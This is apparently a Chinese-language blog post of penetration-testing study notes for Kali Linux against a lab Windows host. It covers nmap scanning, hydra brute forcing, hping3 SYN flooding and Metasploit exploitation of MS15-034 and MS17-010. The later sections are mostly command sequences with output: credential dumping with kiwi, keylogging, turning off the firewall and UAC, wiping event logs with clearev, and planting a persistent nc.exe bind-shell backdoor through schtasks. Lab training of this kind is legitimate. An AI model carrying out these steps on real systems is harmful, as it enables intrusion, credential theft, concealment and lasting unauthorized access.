---
author: Hugo Authors
title: kali
date: 2023-12-25
description:  网络基础知识
series: 
  - 网络安全基础

---

kali使用

<!--more-->
# 基本命令
```
sudo -i   登陆超级用户
passwd root   设置root密码
然后用root用户登录
ifconfig  查看IP地址信息（更改ip地址后需要断开重连就会更新了）
```
## nmap 端口扫描结果
一款开源的网络探测器
- 基本用法
```
nmap[扫描类型][选项]<扫描目标>
nmap 192.168.10.142（目标主机地址） 端口扫描结果
man nmap(查看nmap的手册)
```
- 扫描类型
  - 扫描方式
    - s（扫描）
    - \-sS，TCP半开扫描（只发SYN包），速度快（默认） 
      - \-sS \-O（操作系统），探测目标主机的操作系统
      - \-sS \-p（端口），对多个端口进行扫描，端口之间用`,`隔开，也可以使用使用连续`-`数字
    - \-sT，TCP全开扫描（尝试全连接），结果更准确
    - \-sU，UDP扫描，用于DNS、SNMP
    - \-sP，扫描网段，显示此网段有哪些主机是开放的
    - \-sV（扫描后会多一行VERSION），扫描目标的软件版本
- 端口状态
  - filtered：被过滤的（可能被防火墙拦截了）
  - open：开放的
  - closed：关闭的
  - unfiltered：未被过滤的
# 辅助攻击
## 暴力破解
### crunch字典工具
- 基本用法
```
crunch 最小长度 最大长度 素材字符-o字典文件
crunch 6 6 0123456789 // 6位传数字密码
crunch 6 8 Abc1234    // 由Abc1234随机组成的6~8位密码
```
### hydra爆破工具
开源攻击工具
- 基本用法
```
hydra -l 用户名 -P 密码字典文件 目标地址 服务类型
hydra -l Administrator -P pass.txt 192.168.10.142 rdp
```
- 常用选项
  - \-l：指定用户名
  - \-L：指定用户名字典文件
  - \-p：指定密码
  - \-P：指定密码字典文件
  - \-o：将结果输出到指定文件

## DoS和DDoS
### DoS 拒绝服务
- 攻击概述：
  - 通过各种手段，最终导致目标系统崩溃、失去响应
  - 从而使目标系统不能为正常的用户提供资源或对应的功能
- 常见的DoS攻击方式
  - SYN Flood泛洪
    - 利用TCP三次握手的缺陷来攻击对方主机
  - Ping Flood泛洪
  - UDP Flood 泛洪

#### hping3工具
- 可想目标主机发送任意TCP/IP协议数据包的一款开源的安全工具
- 也用于扫描/防火墙测试/路由追踪/协议分析等场景
- 常用选项
  - \-p：指定目标端口
  - \--syn：设置SYN标记（-S）
  - \--flood：泛洪，尽最快发送数据包，不显示回复
```
hping3 --syn --flood -p 3389 192.168.10.142 //SYN包泛洪测试
ctrl+c    //停止
```
### DDoS
- 分布式拒绝服务
  - 典型的流量攻击，攻击方的主机数量呈现规模化
  - 通常由分布在不同网络、不同位置的成千上万的主机组成攻击方（通常称为botnet僵尸网络），被同一发起者所控制
  - 攻击强度大
  - 防御的难度也大
### 防御DoS/DDoS攻击
- 提高服务方的交付能力
  - 减少服务配置的等待时间
  - 优化单一客户机的并发相应策略
  - 更换高性能设备
  - 增加网络带宽
  - 采用负载均衡架构
  - 部署CDN内容分发网络
- 部署专用软硬件防御产品
  - 冰盾防火墙
  - 流量清洗/DDoS高防IP
  - IDS入侵防御设备
  - 抗DDoS专用防火墙设备


# 渗透测试
https://nvd.nist.gov/
https://www.cnvd.org.cn/
## 概述
  - 渗透测试是什么
    - 是一种通过模拟攻击的技术与方法，打破目标系统的安全防御，并获得目标系统控制访问权的安全测试方法
  - 为什么要进行渗透测试
    - 新系统可能存在未知的安全风险
    - 企业更需要未雨绸缪，而不是亡羊补牢
    - 渗透测试后，如果系统为被攻破，证明之前的安全防御是有效的
    - 渗透测试可以有效的评估系统的安全状态，并该处合理的改进方案
  - 渗透测试的目的
    - 模拟侵入系统获取机密信息
    - 将入侵过程和细节产生报告提供用户
    - 确定用户系统存在的安全威胁，完善安全防御，降低安全风险
## 原则和目标分类
  - 渗透测试的原则
    - 应渐进并且逐步深入，尽可能减少对业务的影响
    - 渗透测试的最大风险：测试过程中对业务产生的影响
    - 渗透测试的合规性：符合规范和法律要求是渗透测试的必要条件
  - 渗透测试的目标分类
    - 针对主机操作系统渗透：Windows、Linux…………
    - 针对数据库系统渗透：MYSQL、MS-SQL…………
    - 针对应用系统渗透：PHP组成的网站…………
    - 针对网络设备渗透：防火墙、路由器、交换机…………
## 渗透测试标准与流程
  - 渗透测试的七个阶段
    - PTES：渗透测试执行标准
      - 定义一次真正的渗透测试过程
      - 渗透测试过程分为七个阶段，并在每个阶段定义不同的扩展级别，选择那种级别由被测试客户决定
  1. 前期交互阶段
    - 事前交互
      - 明确范围：IP、域名、云平台、起止时间
      - 明确规则：目标系统介绍、重点保护对象及特性、相关部门接口人？是否允许数据破坏？是否允许阻断业务正常运行？
      - 确定目标：web应用？人员权限管理漏洞？
  2. 信息收集阶段
    - 信息收集
      - 信息收集是渗透攻击的前提
      - 信息收集工具：Nmap、OpenVAS…………
      - 主动扫描：语言的类型、服务器的类型、目录的结构、使用的软件、数据库类型
      - 开放搜索：人员信息（域名注册人员信息、web应用中网站发帖人的id、管理员姓名）、后台管理页面、默认账号
  3. 威胁建模阶段
  4. 漏洞分析阶段
  5. 渗透攻击阶段
  6. 后渗透攻击阶段
  7. 报告阶段
  

# OpenVAS
- OpenVAS
  - 是一个开源的全功能的漏洞扫描评估系统，是Nessus项目分支
  - 功能包括非认证测试、认证测试、各种互联网和工业协议、大规模扫描的性能调整等
  - 漏洞库持续更新
  - https://github.com/greenbone/openvas-scanner/

kali默认没有安装OpenVAS，在线安装并初始化漏洞列表需要3~5小时
- 登录预先准备好的系统然后用物理机访问`https://192.168.10.224:9392`登陆用户名和密码都是admin

- 执行扫描任务步骤
  - 第一步：添加扫描端口
  - 第二步：添加扫描目标
  - 第三步：执行扫描任务
  - 第四步：检查扫描结果
  - 第五步：提取检测报告
# Msfasploit Framework
- 一款开源的安全漏洞检测工具，简称MSF
  - 可以收集信息、探测系统漏洞、执行漏洞利用测试等，为渗透测试/攻击编码和漏洞研究提供了一个可靠平台
  - 集成数千个漏洞利用、辅助测试模块，并保持持续更新
  - 官方网站:https://metasploit.com/
## 常用模块
- 辅助模块Auxiliary
  - 不直接在测试者和目标主机之间建立访问
  - 只负责执行扫描、嗅探、指纹识别、爆破等相关功能以辅助渗透测试
- 漏洞利用Exploits
  - 利用目标系统、应用或者服务中的安全漏洞进行攻击行为
  - 包括用于破坏系统安全的攻击代码，每个漏洞都有相应的攻击代码
- 攻击载荷Payloads
  - 一般是一段代码，被渗透攻击模块通过安全漏洞植入目标主机中并运行，主要用来与目标主机之间建立一个稳定的连接。可返回Shell或进行程序注入等操作
- 后渗透模块Post
  - 该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等
## 核心命令
- 执行msfconsole进入控制台以后
  - ？———— 获取帮助
  - exit————退出MSF控制台
  - back————返回上一级
  - show————查看模块或相关信息
  - search————搜索模块
  - use————使用模块
  - options————列出当前模块地选项
  - set————设置模块选项
  - run或exploit————运行当前模块

## CVE-2015-1635（MS15-034）漏洞
- HTTP.sys RCE漏洞
  - 漏洞存在于HTTP协议堆栈（HTTP.sys）中，攻击者只要发送恶意http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃
  - 漏洞名称：CVE-2015-1635（允许远程执行代码漏洞）
  - 安全公告：MS15-034
- 影响系统
  - Windows 7/8/8.1
  - Windows Server 2008/2008 R2/2012/2012 R2
- POC脚本检测
  - Proof of Concept“观点证明”
  - 一段验证漏洞的程序，使我们能够确认这个漏洞是真实存在的
  - 脚本上传
    - 上传cve-2015-1635.poc到kali系统/root目录下
# 漏洞检测
## 两种漏洞检测
1. 利用脚本
    - `第一步`：POC脚本检测
      - 上传cve-2015-1635.poc到kali系统
      - 修改cve-2015-1635.poc文件中的ipaddr为windows靶机地址
      ```
      cat cve-2015-1635.poc     查看文件
      ```
      - 使用python执行POC脚本
      ```
      [root]python2 cve-2015-1635.poc
      [*]Audit Started     //审计开始
      [!!]Looks VULN      //看起来是脆弱的
      ```
2. 利用软件形成检测报告从而知道其中漏洞
    - OpenVAS

## `第二步`搜索CVE-2015-1635或MS15-034
```
[root]msfconsole
msf6 > search MS15-034    //或CVE-2015-1635
   0  auxiliary/dos/http/ms15_034_ulonglongadd  //攻击
   1  auxiliary/scanner/http/ms15_034_http_sys_memory_dump  //扫描 
```
## `第三步`使用 1 先做扫描
```
msf6 > use 1    //执行扫描
> set rhosts 192.168.10.142   //准备对此IP进行扫描
> run       //执行


[+] Target may be vulnerable...       //目标可能是脆弱的
```
## `第四步`退出扫描，切换攻击
```
msf6 > use 0    //执行攻击
> set rhosts 192.168.10.142   //准备对此IP进行攻击
> run       //执行

[*] DOS request sent          //DOS请求已发送
[*] Scanned 1 of 1 hosts (100% complete)    //扫描1个主机已完成
[*] Auxiliary module execution completed    //辅助模块执行完成

```
执行完这些命令后如果你的windows2008具有这个漏洞就会出现蓝屏情况

## `第五步`第一种漏洞防御
这个漏洞是对你的主机的输出缓存漏洞进行攻击的，我们将它关掉就可以实现防御

关闭内核缓存后，再执行攻击命令就不会出现蓝屏情况了

## `第六步`再次发起漏洞利用，发现靶机不蓝屏了

## 第二种漏洞防御
`第七步`重启内核缓存

`第八步`利用漏洞防御补丁来进行防御
- 针对MS15-034漏洞进行防御
- 上传Windows6.1-KB3042553-x64-2008R2.msu（微软官方网站下载）
- 安装后系统会自动重启
- `第九步`装完后对系统漏洞进行检测
```
msf6 > use 1    //执行扫描
> set rhosts 192.168.10.142   //准备对此IP进行扫描
> run       //执行


[-] Target is not vulnerable    //目标可能不在脆弱了

```
- `第十步`再次使用POC脚本检测
```
[root]python2 cve-2015-1635.poc

  
[*] Audit Started     //开始审计
[*] Looks Patched     //看起来已修补过
```
## CVE-2017-0143（MS17-010）漏洞
- 永恒之蓝
  - 漏洞通过TCP的445和139端口，利用SMB远程代码执行漏洞
  - 攻击者可以在目标系统上执行任意代码
- 影响系统
  - Windows 7/8/8.1/10
  - Windows Server 2008/2012/2016
- 扫描漏洞和攻击漏洞步骤都是一样的
### 获取账号密码
- 第一种
  - 当执行完攻击脚本后会进入
  ![](/images/获取的用户名密码.png)
  - 现在最前面的就是用户名，后面发白的部分就是明文密码（第三个`:`到第四个`:`之间就是密码的明文加密
  - 明文密码可以使用一个网站来进行解密：`https://www.cmd5.com/`破解MD5弱密码
- 第二种获取密码
  - 加载kiwi模块，通过kiwi模块获取用户口令
  ```
  meterpreter > load kiwi     //加载kiwi
  meterpreter > creds_all     //读取系统中的账户信息 
  只有当内边的用户将用户名密码输入并开机，那么我们就可以通过监察内存来获得用户名密码
  ```
  ![](/images/内存用户名密码.png)
### 进程迁移
```
meterpreter > getuid    //获取用户信息
Server username: NT AUTHORITY\SYSTEM


meterpreter > ps -S "explorer"      //查看进程
Filtering on 'explorer'

Process List
============

 PID   PPID  Name        Arch  Session  User              Path
 ---   ----  ----        ----  -------  ----              ----
 3000  1784  explorer.e  x64   1        WIN-5MQI51VLCDC\  C:\Windows\Explor
             xe                         Administrator     er.EXE

meterpreter > migrate 3000        //进程迁移
[*] Migrating from 1080 to 3000...    //从1052迁移到5452
[*] Migration completed successfully.   //迁移成功完成

meterpreter > getuid            //再次获取用户信息
Server username: WIN-5MQI51VLCDC\Administrator

```
- explorer进程是系统进程，稳定，Administrator权限

### 开启键盘记录
```
meterpreter > run post/windows/capture/keylog_recorder 

[*] Keystrokes being saved in to /root/.msf4/loot/20231227154427_default_192.168.10.142_host.windows.key_039902.txt

//在win2008打开记事本，输入任意内容
//在kali中重新打开一个终端

[root]cat /root/.msf4/loot/20231227154427_default_192.168.10.142_…………

asd
asdasasdgadfgsdfhfghfgh       //windows2008输入的内容

```
### 设置防火墙
```
meterpreter > shell   //切换到目标主机的命令行终端
C:\Windows\system32>netsh advfirewall set allprofiles state off
//关闭防火墙
C:\Windows\system32>netsh advfirewall set allprofiles state on
//开启防火墙
C:\Windows\system32>netsh firewall add portopening tcp 444 backdoor 
enable all
//添加入站规则，规则名backdoor 协议TCP 端口444

```
### 关闭用户账户控制————操作注册表关闭UAC
- UAC：User Account Control 用户账户控制，是windows在操作系统中一种安全控制机制使用UAC，可以防止未经授权应用程序的自动安装，组织恶意程序
- ADD 添加一个注册表项
  - /v创建键值
  - /t键值类型
  - /d键值的值
  - /f强制覆盖
```
C:\Windows\system32>reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
```
- 使用clearev命令，清除安全日志
  - 完成清除后，目标主机的安全日志为空
```
meterpreter > clearev
[*] Wiping 446 records from Application...
[*] Wiping 1747 records from System...
[*] Wiping 1055 records from Security...
```
  ![](/images/清除日志后的结果.png)

### 持久性后门程序植入
- 上传后门程序植入
```
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
//nc.exe  瑞士军刀

[*] uploading  : /usr/share/windows-binaries/nc.exe -> C:\windows\system32
[*] uploaded   : /usr/share/windows-binaries/nc.exe -> C:\windows\system32\nc.exe


meterpreter > shell

Process 1540 created.
Channel 2 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����



C:\Windows\system32>chcp 65001

chcp 65001
Active code page: 65001



C:\Windows\system32>schtasks /create /tn "nc" /ru system /tr "c:\windows\system32\nc.exe -Ldp 444 -e cmd.exe" /sc onstart
schtasks /create /tn "nc" /ru system /tr "c:\windows\system32\nc.exe -Ldp 444 -e cmd.exe" /sc onstart

SUCCESS: The scheduled task "nc" has successfully been created.
```

- 然后用nc连接后门程序
```
┌──(kali㉿kali)-[~]
└─$ nc 192.168.10.142 444

Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����


C:\Windows\system32>hostname   
 
hostname
WIN-5MQI51VLCDC
```

# LINUX
 